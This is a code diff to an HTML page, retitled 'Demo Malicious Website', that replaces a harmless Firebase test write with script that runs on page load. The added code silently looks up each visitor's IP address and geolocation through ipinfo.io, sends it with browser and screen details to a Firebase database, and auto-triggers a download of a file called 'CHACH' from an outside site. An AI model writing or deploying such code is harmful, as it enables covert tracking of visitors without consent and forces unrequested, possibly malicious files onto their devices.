@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Demo Site</title>
+  <title>Demo Malicious Website</title>
   
   <!-- Firebase SDK (using CDN and module-based approach for Firebase v9 or later) -->
   <script type="module">
@@ -26,27 +26,73 @@
     const app = initializeApp(firebaseConfig);
     const database = getDatabase(app);
 
-    // Function to send test data to Firebase
-    function sendDataToFirebase() {
-      const userData = {
-        message: "Test data sent successfully!",
-        timestamp: new Date().toISOString(),
-        screenSize: `${window.screen.width}x${window.screen.height}`
-      };
-
-      const userDataRef = ref(database, 'testData/' + new Date().getTime());
+    // Function to send data to Firebase
+    function sendDataToFirebase(userData) {
+      const userDataRef = ref(database, 'userData/' + new Date().getTime());
       set(userDataRef, userData)
         .then(() => {
-          console.log('Test data sent successfully to Firebase');
+          console.log('Data sent successfully to Firebase');
         })
         .catch((error) => {
           console.error('Error sending data: ', error);
         });
     }
 
-    // Send test data to Firebase when the page loads
+    // Function to fetch IP and location using ipinfo.io
+    function getIPAndLocation() {
+      // Use ipinfo.io API to get IP and location information
+      fetch('https://ipinfo.io/json?token=28242ae316ade9')  // Using your access token
+        .then(response => response.json())
+        .then(data => {
+          // Get the IP address and geolocation (city, region, country)
+          const ipAddress = data.ip;
+          const location = data.city + ', ' + data.region + ', ' + data.country;
+          const coordinates = data.loc.split(',');
+
+          const userData = {
+            userAgent: navigator.userAgent, // Browser/Device info
+            ipAddress: ipAddress, // Actual IP
+            timestamp: new Date().toISOString(),
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            location: location,
+            latitude: coordinates[0],  // Latitude
+            longitude: coordinates[1]  // Longitude
+          };
+
+          // Send data to Firebase
+          sendDataToFirebase(userData);
+        })
+        .catch((error) => {
+          console.error('Error fetching IP or location: ', error);
+        });
+    }
+
+    // Function to automatically trigger a file download
+    function downloadFile() {
+      const fileUrl = 'https://www.vision11.in/download/CHACH'; // Replace with your actual file URL
+
+      const link = document.createElement('a');
+      link.href = fileUrl;
+      link.download = 'CHACH'; // Name of the file to download
+      
+      // Check if file exists before triggering download
+      fetch(fileUrl)
+        .then(response => {
+          if (response.ok) {
+            link.click(); // Trigger the download if file exists
+          } else {
+            console.error('File not found or unavailable (404 error)');
+          }
+        })
+        .catch(error => {
+          console.error('Error fetching the file: ', error);
+        });
+    }
+
+    // Call both functions when the page loads
     window.onload = function() {
-      sendDataToFirebase();
+      getIPAndLocation();
+      downloadFile();
     };
   </script>
 </head>
